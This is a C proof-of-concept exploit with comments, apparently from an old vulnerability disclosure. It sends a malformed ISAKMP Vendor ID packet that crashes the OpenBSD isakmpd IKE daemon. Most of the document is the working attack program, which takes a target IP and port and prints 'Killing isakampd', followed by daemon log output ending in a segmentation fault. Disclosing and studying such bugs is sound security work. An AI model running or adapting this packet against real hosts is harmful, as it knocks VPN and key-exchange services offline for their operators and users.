/* John Lampe
OK, so there is a field within isakamp messages for Vendor ID.  Isakampd is an IKE daemon for *BSD which is
loosely related to the OpenBSD project.  So, if you specify 'Next Payload' equal to 0x0D (Vendor ID), and then
within the actual ISAKMP payload where you identify the vendor, you send a bunch of bogus garbage, then you
will get a SIGSEGV, Segmentation fault.  

To reproduce, run the program below.  Overflow was found by SPIKE (http://www.immunitysec.com).


--------------------SNIP
*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <arpa/nameser.h>
#include <errno.h>


int main(int argc, char *argv[]) {
        struct sockaddr_in addr;
        int s,i,port;
        char *host = NULL;
        char big_foo[] =
"\xFF\x00\xFE\x01\xFD\x02\xFC\x03\x00\x00\x00\x00\x00\x00\x00\x00"
"\x0D\x10\x02\x00\x00\x00\x00\x00\x00\x00\x01\x50\x00\x00\x01\x34"
"\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x01\x28\x01\x01\x00\x01"
"\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02"
"\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04"
"\x00\x20\xC4\x9B\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05"
"\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01"
"\x00\x0C\x00\x04\x00\x20\xC4\x9B\x03\x00\x00\x24\x03\x01\x00\x00"
"\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02"
"\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x20\xC4\x9B\x03\x00\x00\x24"
"\x04\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01"
"\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x20\xC4\x9B"
"\x03\x00\x00\x24\x05\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02"
"\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04"
"\x00\x20\xC4\x9B\x03\x00\x00\x24\x06\x01\x00\x00\x80\x01\x00\x05"
"\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01"
"\x00\x0C\x00\x04\x00\x20\xC4\x9B\x03\x00\x00\x24\x07\x01\x00\x00"
"\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02"
"\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x20\xC4\x9B\x00\x00\x00\x24"
"\x08\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01"
"\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x20\xC4\x9B";


        if (argc != 3) {
                fprintf(stderr, "Use: %s [ip] [port]\n", argv[0]);
                exit(1);
        }


        host = argv[1];
        port = atoi(argv[2]);

        if ((port < 1) || (port > 65535)) {
                fprintf(stderr, "Bad port num %d\n", port);
                exit(1);
        }


        memset(&addr, 0, sizeof(addr));


        if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
                fprintf(stderr, "Socket error: %s\n", strerror(errno));
                exit(EXIT_FAILURE);
        }

        fprintf(stderr, "Killing isakampd\n");

        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(host);
        connect(s, (struct sockaddr *)&addr, sizeof(addr));
        write(s, big_foo, sizeof(big_foo) - 1);
        close(s);
        fprintf(stderr, "Wrote %d bytes to socket\n", sizeof(big_foo) - 1);
        fprintf(stderr, "done.\n");
}



/*
So, running this code against OpenBSD Isakampd server will consistently cause the following to be generated:

212158.486806 Trpt 70 transport_add: adding 0x8083200
212158.486967 Trpt 95 transport_reference: transport 0x8083200 now has 1 references
212158.487056 Mesg 90 message_alloc: allocated 0x8080800
212158.487723 Mesg 70 message_recv: message 0x8080800
212158.487837 Mesg 70 ICOOKIE: 0xff00fe01fd02fc03
212158.488068 Mesg 70 RCOOKIE: 0x0000000000000000
212158.488133 Mesg 70 NEXT_PAYLOAD: VENDOR
212158.488189 Mesg 70 VERSION: 16
212158.488241 Mesg 70 EXCH_TYPE: ID_PROT
212158.488295 Mesg 70 FLAGS: [ ]
212158.488350 Mesg 70 MESSAGE_ID: 0x00000000
212158.488404 Mesg 70 LENGTH: 336
212158.488561 Mesg 70 message_recv: ff00fe01 fd02fc03 00000000 00000000 0d100200 00000000 00000150 00000134
212158.488648 Mesg 70 message_recv: 00000001 00000001 00000128 01010001 03000024 01010000 80010005 80020002
212158.488732 Mesg 70 message_recv: 80030001 80040002 800b0001 000c0004 0020c49b 03000024 02010000 80010005
212158.488898 Mesg 70 message_recv: 80020002 80030001 80040002 800b0001 000c0004 0020c49b 03000024 03010000
212158.488982 Mesg 70 message_recv: 80010005 80020002 80030001 80040002 800b0001 000c0004 0020c49b 03000024
212158.489066 Mesg 70 message_recv: 04010000 80010005 80020002 80030001 80040002 800b0001 000c0004 0020c49b
212158.489229 Mesg 70 message_recv: 03000024 05010000 80010005 80020002 80030001 80040002 800b0001 000c0004
212158.489314 Mesg 70 message_recv: 0020c49b 03000024 06010000 80010005 80020002 80030001 80040002 800b0001
212158.489399 Mesg 70 message_recv: 000c0004 0020c49b 03000024 07010000 80010005 80020002 80030001 80040002
212158.489534 Mesg 70 message_recv: 800b0001 000c0004 0020c49b 00000024 08010000 80010005 80020002 80030001
212158.489605 Mesg 70 message_recv: 80040002 800b0001 000c0004 0020c49b
212158.489745 SA   90 sa_find: no SA matched query
212158.489818 Mesg 50 message_parse_payloads: offset 0x1c payload VENDOR
212158.489956 Mesg 60 message_validate_payloads: payload VENDOR at 0x808541c of message 0x8080800
Segmentation fault - core dumped
*/


